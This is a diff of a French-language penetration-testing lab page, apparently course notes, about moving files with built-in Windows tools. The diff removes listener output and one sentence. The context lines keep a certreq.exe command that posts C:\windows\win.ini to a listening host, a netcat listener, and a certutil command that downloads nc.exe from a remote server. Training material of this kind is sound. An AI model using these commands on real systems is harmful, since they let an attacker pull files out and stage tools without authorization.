@@ -38,25 +38,6 @@ certreq.exe -Post -config http://192.168.49.128:8000/ C:\windows\win.ini
 {% code fullWidth="true" %}
 ```bash
 mrroboteLiot@htb[/htb]$ sudo nc -lvnp 8000
-
-listening on [any] 8000 ...
-connect to [192.168.49.128] from (UNKNOWN) [192.168.49.1] 53819
-POST / HTTP/1.1
-Cache-Control: no-cache
-Connection: Keep-Alive
-Pragma: no-cache
-Content-Type: application/json
-User-Agent: Mozilla/4.0 (compatible; Win32; NDES client 10.0.19041.1466/vb_release_svc_prod1)
-Content-Length: 92
-Host: 192.168.49.128:8000
-
-; for 16-bit app support
-[fonts]
-[extensions]
-[mci extensions]
-[files]
-[Mail]
-MAPI=1
 ```
 {% endcode %}
 
@@ -107,8 +88,6 @@ certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
 5.  <mark style="color:green;">**PowerShell et BITS (Windows)**</mark>
 
     Utilisation : PowerShell permet une interaction avancée avec BITS pour télécharger des fichiers.
-
-Exemple : Télécharger un fichier avec PowerShell :
 
 {% code overflow="wrap" fullWidth="true" %}
 ```powershell
